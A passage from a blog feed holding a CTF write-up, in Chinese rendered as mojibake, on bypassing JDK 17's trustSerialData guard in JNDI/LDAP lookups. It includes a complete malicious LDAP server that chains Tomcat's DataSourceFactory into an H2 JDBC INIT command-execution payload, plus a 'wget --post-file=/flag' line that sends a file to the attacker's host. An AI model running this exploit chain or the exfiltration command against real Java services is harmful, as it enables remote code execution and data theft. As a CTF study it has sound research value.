class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        System<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi.ldap.object.trustSerialData"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InitialContext initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String path  <span class="token operator">=</span> <span class="token string">"127.0.0.1:1389/Tom"</span><span class="token punctuation">;</span>        String url <span class="token operator">=</span> <span class="token string">"ldap://"</span> <span class="token operator">+</span> path<span class="token punctuation">;</span>        initialContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>server</code>çš„è¯å°±å…ˆç”¨<code>JNDI-Injection-Exploit-Plus-2.4-SNAPSHOT-all.jar</code>çœ‹çœ‹åˆ°åº•ä»€ä¹ˆæƒ…å†µã€‚</p><h4 id="è§£é¢˜-è°ƒè¯•"><a href="#è§£é¢˜-è°ƒè¯•" class="headerlink" title="è§£é¢˜+è°ƒè¯•"></a>è§£é¢˜+è°ƒè¯•</h4><p>å®¢æˆ·ç«¯ä¸­çš„<code>path</code>è®¾ç½®æˆ<code>yourvpsip:1389/deserialURLDNS</code>ï¼Œå¼€è°ƒï¼</p><p>å‰é¢çš„åè®®è§£æä¸ç”¨ç»†çœ‹ï¼Œæ²¡ä»€ä¹ˆå¯åˆ©ç”¨çš„ã€‚å®šä½åˆ°<code>com.sun.jndi.ldap.LdapCtx#c_lookup</code>ã€‚</p><p>è¿™é‡ŒåŒæ—¶é€šè¿‡<code>doSearchOnce(name, &quot;(objectClass=*)&quot;, cons, true);</code>æ‹¿åˆ°<code>ldapserver</code>çš„ä¿¡æ¯ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716784305902.png" alt="1716784305902"></p><p>ä»ä¸Šå›¾çœ‹åˆ°ï¼Œæ¯”è¾ƒé‡è¦çš„å°±æ˜¯<code>answer</code>é‡Œé¢æœ‰<code>LdapEntry</code>ï¼Œå…¶ä¸­æœ€é‡è¦çš„å°±æ˜¯<code>attrs</code>ä¸­çš„<code>javaserializeddata</code>ï¼Œå› ä¸ºæˆ‘ç”¨çš„æ˜¯<code>deserialURLDNS</code>æµ‹è¯•ï¼Œæ‰€ä»¥<code>ldapserver</code>ä¸­ä¼šå¾€<code>javaserializeddata</code>å¡è¿›ååºåˆ—åŒ–æ•°æ®ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716784512059.png" alt="1716784512059"></p><p>è€Œåé¢çš„é€»è¾‘å°±æ˜¯è§£ææ‹¿åˆ°<code>attrs</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716784736264.png" alt="1716784736264"></p><p>åé¢æ»¡è¶³<code>if (attrs.get(Obj.*JAVA_ATTRIBUTES*[Obj.*CLASSNAME*]) != null)</code>æ‰ä¼šæ‰§è¡Œ<code>decodeObject</code>æ–¹æ³•ã€‚<code>Obj.*JAVA_ATTRIBUTES*[Obj.*CLASSNAME*]</code>ä¸º<code>javaClassName</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716784996191.png" alt="1716784996191"></p><p>ä¹Ÿå°±æ˜¯è¯´åªè¦æœåŠ¡ç«¯å¡äº†<code>javaClassName</code>å°±èƒ½èµ°æ­£å¸¸æµç¨‹ã€‚</p><p>è·Ÿè¿›<code>decodeObject</code>ï¼Œ<code>attrs</code>æœ‰<code>javaSerializedData</code>åˆ™ä¼šèµ°<code>deserializeObject</code>ï¼Œè¿™ä¹Ÿå°±æ˜¯æœ€å¸¸è§çš„é€šè¿‡<code>ldap</code>æ‰“ååºåˆ—åŒ–çš„è·¯å¾„ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240527124528086.png" alt="image-20240527124528086"></p><p>ä½†æ˜¯åœ¨è¿™ä¹‹å‰ä¼šé€šè¿‡<code>VersionHelper.*isSerialDataAllowed*()</code>è¿›è¡Œæ ¡éªŒã€‚ç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716785235961.png" alt="1716785235961"></p><p><code>isSerialDataAllowed</code>ç›´æ¥è¿”å›<code>trustSerialData</code>ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isSerialDataAllowed</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> trustSerialData<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è€Œåœ¨<code>static</code>æ®µä¸­çœ‹åˆ°<code>jdk17</code>é»˜è®¤<code>com.sun.jndi.ldap.object.trustSerialData</code>ä¸º<code>true</code>ï¼Œè€Œç”±äºè¿™é“é¢˜è®¾ç½®äº†<code>trustSerialData</code>ä¸º<code>false</code>ï¼Œæ‰€ä»¥æ­¤æ¡ååºåˆ—åŒ–ä¸é€šã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716785314234.png" alt="1716785314234"></p><p>å¤šæä¸€å˜´ï¼Œåœ¨<code>jdk20+</code>ç‰ˆæœ¬ä¸­<code>com.sun.jndi.ldap.object.trustSerialData</code>é»˜è®¤ä¸º<code>false</code>ã€‚</p><p>æœ€ç»ˆæŠ¥é”™ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716785452107.png" alt="1716785452107"></p><p>ååºåˆ—åŒ–è¿™æ¡è·¯èµ°ä¸é€šï¼Œå†çœ‹çœ‹å…¶å®ƒçš„è·¯ã€‚</p><p><code>JAVA_ATTRIBUTES[REMOTE_LOC]</code>ä¸º<code>javaRemoteLocation</code>ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>attr <span class="token operator">=</span> attrs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span>REMOTE_LOC<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// For backward compatibility only</span>                <span class="token keyword">return</span> <span class="token function">decodeRmiObject</span><span class="token punctuation">(</span>                    <span class="token punctuation">(</span>String<span class="token punctuation">)</span>attrs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span>CLASSNAME<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token punctuation">(</span>String<span class="token punctuation">)</span>attr<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> codebases<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœ<code>attrs</code>æœ‰<code>javaRemoteLocation</code>ä¼šè°ƒç”¨<code>decodeRmiObject</code>ã€‚</p><p>è€Œè¿™ä¸ªæ–¹æ³•åªç»™<code>Reference</code>å¡è¿›å»<code>javaClassName</code>ï¼Œ<code>javaRemoteLocation</code>ã€‚æˆ‘ä»¬çš„ç›®çš„æ˜¯æ‰“æœ¬åœ°å·¥å‚ç±»ï¼Œæœ€èµ·ç éœ€è¦å¡è¿›å»<code>javaFactory</code>è¿™ä¸ªå±æ€§ï¼Œæ‰€ä»¥è¿™æ¡è·¯ï¼ˆå¤§æ¦‚è‚¯å®šï¼‰æ²¡æ³•åˆ©ç”¨ã€‚</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">private</span> <span class="token keyword">static</span> Object <span class="token function">decodeRmiObject</span><span class="token punctuation">(</span>String className<span class="token punctuation">,</span>        String rmiName<span class="token punctuation">,</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> codebases<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"URL"</span><span class="token punctuation">,</span> rmiName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>é™¤æ­¤ä¹‹å¤–ï¼Œ ä¸‹é¢è¿˜æœ‰ä¸€æ¡è·¯ä¼šè°ƒç”¨åˆ°<code>*decodeReference*</code>æ–¹æ³•ï¼Œ<code>*JAVA_ATTRIBUTES*[*OBJECT_CLASS*]</code>æ˜¯<code>objectClass</code></p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716785969458.png" alt="1716785969458"></p><p>å¦‚æœæ»¡è¶³<code>attrs[&quot;objectClass&quot;]==JAVA_OBJECT_CLASSES[REF_OBJECT]</code>ï¼Œå³<code>attrs[&quot;objectClass&quot;]==&quot;javaNamingReference&quot;</code>åˆ™ä¼šè¿›å…¥<code>decodeReference</code>æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•é€»è¾‘å†™çš„æœ‰ä¸€å¤§å¨ä¸å¤ªå¥½ç›´æ¥çœ‹æ‡‚ï¼Œæ‰€ä»¥å…ˆè°ƒè¿›å»çœ‹çœ‹æ˜¯ä»€ä¹ˆå¤„ç†é€»è¾‘ã€‚</p><p>æ”¹ä¸€ä¸‹<code>ldapserver</code>ï¼Œå¡è¿›å»ä¸€ä¸ª<code>objectClass</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716786479682.png" alt="1716786479682"></p><p>å¯åŠ¨å¼€è°ƒï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716787255939.png" alt="1716787255939"></p><p>æˆåŠŸè¿›å…¥<code>decodeReference</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716787565949.png" alt="1716787565949"></p><p>å¯ä»¥çœ‹åˆ°ä¼š<code>new Reference(className, factory,     (codebases != null? codebases[0] : null));</code>å®ä¾‹åŒ–å¸¦å·¥å‚ç±»ä»¥åŠç±»åçš„<code>Reference</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716787637768.jpg" alt="1716787637768"></p><p>æœåŠ¡ç«¯è¿™ä¹ˆå†™ï¼Œå› ä¸ºè¿œç¨‹æœ‰<code>tomcat-jdbc</code>ç›´æ¥æ‰“<code>org.apache.tomcat.jdbc.pool.DataSourceFactory</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716787741570.png" alt="1716787741570"></p><p>é‡æ–°ç¼–è¯‘è¿è¡Œï¼Œç›´æ¥å®šä½åˆ°<code>c_lookup</code>æœ€åçš„<code>DirectoryManager.*getObjectInstance*</code>æ–¹æ³•ã€‚<code>obj</code>æœç„¶æ˜¯ä¸ª<code>reference</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240527133154914.png" alt="image-20240527133154914"></p><p>æˆåŠŸå®ä¾‹åŒ–<code>factory</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716788122413.png" alt="1716788122413"></p><p>æœ€ç»ˆèµ°åˆ°<code>DataSourceFactory</code>è¿›è€Œè§¦å‘<code>jdbc</code>è¿æ¥ï¼Œä½†<code>properties</code>æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥æ‰“ä¸äº†ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716788180452.png" alt="1716788180452"></p><p>è€Œ<code>properties</code>æ˜¯ä»<code>reference</code>ä¸­æ‹¿æ¥çš„ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> ALL_PROPERTIES<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>    String propertyName <span class="token operator">=</span> ALL_PROPERTIES<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    RefAddr ra <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>propertyName<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ra <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String propertyValue <span class="token operator">=</span> ra<span class="token punctuation">.</span><span class="token function">getContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        properties<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>propertyName<span class="token punctuation">,</span> propertyValue<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥è¿˜æ˜¯è¦çœ‹<code>decodeReference</code>é‚£ä¸€å¨é€»è¾‘ã€‚</p><p>å›åˆ°<code>decodeReference</code>ï¼Œåœ¨å¾—åˆ°<code>reference</code>ä¹‹åï¼Œä¼šå¤„ç†<code>javaRerenceAddress</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716788404308.png" alt="1716788404308"></p><p>è¿™ä¸ª<code>if</code>å¤„ç†é€»è¾‘éå¸¸é•¿ï¼Œç›´æ¥çœ‹æœ€åçš„å¤„ç†äº†è§£ä»–æ˜¯å¹²å•¥çš„ã€‚å‘ç°æ˜¯è¿™ä¸ª<code>if</code>å°±æ˜¯æŠŠ<code>refAddrList</code>çš„å…ƒç´ æ”¾è¿›<code>ref</code>ä¸­ï¼Œæ‰€ä»¥é€šè¿‡è¿™é‡Œå°±èƒ½æ»¡è¶³ä¸Šè¿°<code>jdbc</code>æ”»å‡»éœ€è¦çš„<code>properties</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716788496520.png" alt="1716788496520"></p><p>æ¥ç€çœ‹<code>if</code>é€»è¾‘ï¼Œè¿™é‡Œä¼šæ‹¿<code>attr</code>ï¼Œå¹¶é€šè¿‡<code>val = (String)vals.next();</code>éå†ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨<code>ldapserver</code>ç»™<code>javaReferenceAddress</code>èµ‹å€¼æˆ<code>new String[]&#123;&#125;</code>æ•°ç»„çš„å½¢å¼ä»è€Œéå†<code>element</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716788722886.png" alt="1716788722886"></p><p>è¿™é‡Œæ˜¯å–ç¬¬ä¸€ä¸ªå­—ç¬¦ä½œä¸ºå…¨å±€åˆ†éš”ç¬¦ï¼Œ<code>posnStr</code>å°±æ˜¯ç¬¬ä¸€ä¸ªåˆ†éš”ç¬¦åˆ°ç¬¬äºŒä¸ªåˆ†éš”ç¬¦ä¹‹é—´çš„å­—ç¬¦ï¼Œå…¶å®è¿™ä¸ª<code>posnStr</code>å°±æ˜¯ç´¢å¼•ã€‚æ¯”å¦‚å¡«<code>/0/url/jdbc:xxx</code>ï¼Œé‚£ä¹ˆ<code>posnStr</code>å°±æ˜¯<code>0</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716788834999.png" alt="1716788834999"></p><p>ä¹‹åå–<code>type</code>ï¼Œè¿™é‡Œå°±æ˜¯<code>url</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716789141219.png" alt="1716789141219"></p><p>æœ€åé€šè¿‡<code>setElementAt</code>è®¾ç½®ç´¢å¼•ï¼Œç„¶åç»™<code>refAddrList</code>èµ‹å€¼ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716789197118.png" alt="1716789197118"></p><p>æœ€åæŠŠ<code>refAddrList</code>å¤åˆ¶åˆ°<code>ref</code>ä¸­ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716789327933.png" alt="1716789327933"></p><p>åé¢å°±æ˜¯æ‰“<code>h2jdbc</code>äº†ï¼Œ<code>java15</code>ä¹‹åæ²¡æœ‰<code>nashorn</code>ï¼Œæ‰€ä»¥é€šè¿‡<code>javac</code>æ‰§è¡Œä»£ç ã€‚</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>ç»¼ä¸Šåˆ†æï¼Œæœ€ç»ˆ<code>ldapserver</code>åº”è¯¥å†™æˆå¦‚ä¸‹å½¢å¼ï¼ˆåˆ†éš”ç¬¦é€‰ä¸ªè‡ªå·±å–œæ¬¢çš„<code>/</code>ï¼‰ï¼š</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>InMemoryDirectoryServer<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>InMemoryDirectoryServerConfig<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>InMemoryListenerConfig<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span>InMemoryInterceptedSearchResult<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span>InMemoryOperationInterceptor<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span>Entry<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span>LDAPResult<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span>ResultCode<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Reference<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>StringRefAddr<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>net<span class="token punctuation">.</span>ServerSocketFactory<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>net<span class="token punctuation">.</span>SocketFactory<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>net<span class="token punctuation">.</span>ssl<span class="token punctuation">.</span>SSLSocketFactory<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>InetAddress<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            InMemoryDirectoryServerConfig config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryDirectoryServerConfig</span><span class="token punctuation">(</span><span class="token string">"dc=example,dc=com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            config<span class="token punctuation">.</span><span class="token function">setListenerConfigs</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InMemoryListenerConfig</span><span class="token punctuation">(</span>                    <span class="token string">"listen"</span><span class="token punctuation">,</span>                    InetAddress<span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token number">1389</span><span class="token punctuation">,</span>                    ServerSocketFactory<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    SocketFactory<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token punctuation">(</span>SSLSocketFactory<span class="token punctuation">)</span> SSLSocketFactory<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            config<span class="token punctuation">.</span><span class="token function">addInMemoryOperationInterceptor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">OperationInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            InMemoryDirectoryServer ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryDirectoryServer</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"[LDAP] Listening on 0.0.0.0:1389"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ds<span class="token punctuation">.</span><span class="token function">startListening</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">OperationInterceptor</span> <span class="token keyword">extends</span> <span class="token class-name">InMemoryOperationInterceptor</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">processSearchResult</span><span class="token punctuation">(</span>InMemoryInterceptedSearchResult searchResult<span class="token punctuation">)</span> <span class="token punctuation">{</span>            String base <span class="token operator">=</span> searchResult<span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBaseDN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Entry e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Entry</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"objectClass"</span><span class="token punctuation">,</span><span class="token string">"javaNamingReference"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"javaClassName"</span><span class="token punctuation">,</span> <span class="token string">"javax.sql.DataSource"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"javaFactory"</span><span class="token punctuation">,</span><span class="token string">"org.apache.tomcat.jdbc.pool.DataSourceFactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String JDBC_URL <span class="token operator">=</span> <span class="token string">"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"1\"\\;}'\\;CALL EXEC ('calc')"</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"javaReferenceAddress"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/0/url/"</span><span class="token operator">+</span>JDBC_URL<span class="token punctuation">,</span><span class="token string">"/1/driverClassName/org.h2.Driver"</span><span class="token punctuation">,</span><span class="token string">"/2/username/Squirt1e"</span><span class="token punctuation">,</span><span class="token string">"/3/password/Squirt1e"</span><span class="token punctuation">,</span><span class="token string">"/4/initialSize/1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                searchResult<span class="token punctuation">.</span><span class="token function">sendSearchEntry</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>                searchResult<span class="token punctuation">.</span><span class="token function">setResult</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LDAPResult</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> ResultCode<span class="token punctuation">.</span>SUCCESS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>                ex<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ¬åœ°é€šï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240527135959034.png" alt="image-20240527135959034"></p><p>è¿œç¨‹å¥½åƒå¼¹ä¸å‡ºæ¥<code>shell</code>ï¼Ÿä½¿ç”¨<code>wget xxx:19002 --post-file=/flag</code>å¤–å¸¦å¾—åˆ°<code>flag</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240527140108917.png" alt="image-20240527140108917"></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç ”ç©¶ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
            <tag> å®‰å…¨ç ”ç©¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RASPå¼€å‘æ‚è®°</title>
      <link href="/2024/05/16/rasp-kai-fa-bug-za-ji/"/>
      <url>/2024/05/16/rasp-kai-fa-bug-za-ji/</url>
      
